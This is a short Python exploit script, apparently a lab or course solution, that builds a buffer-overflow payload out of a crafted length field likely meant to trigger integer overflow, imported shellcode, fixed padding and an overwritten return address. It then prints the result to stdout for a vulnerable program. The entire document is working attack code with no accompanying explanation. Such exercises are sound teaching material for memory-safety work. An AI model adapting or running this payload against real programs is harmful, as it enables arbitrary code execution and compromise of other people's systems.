from shellcode import shellcode
import sys
from struct import pack

count = pack("<I", 0x40000052)
attack = count + shellcode + b'A'*327 + pack("<I", 0xfff6bfe0)

sys.stdout.buffer.write(attack)
